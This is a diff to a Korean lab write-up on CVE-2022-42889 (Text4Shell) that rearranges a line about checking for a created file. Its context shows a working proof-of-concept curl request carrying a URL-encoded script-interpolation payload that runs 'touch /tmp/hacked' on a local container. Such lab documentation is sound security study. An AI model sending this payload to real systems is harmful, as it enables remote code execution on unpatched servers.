@@ -68,6 +68,7 @@ url 인코딩 후, 아래와 같이 Localhost:8080에 입력
 curl "http://localhost:8080/test?input=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch%20%2Ftmp%2Fhacked%27%29%7D"
 ```
 ![PoC 요청 결과](./CVE-2022-42889/1.png)
-컨테이너 내부 파일 생성 여부 확인
 명령이 실행 중이며 아직 종료되지 않았다는 의미이다. (touch 명령은 바로 끝남)
+
+컨테이너 내부 파일 생성 여부 확인
 ![PoC 요청 결과](./CVE-2022-42889/2.png)
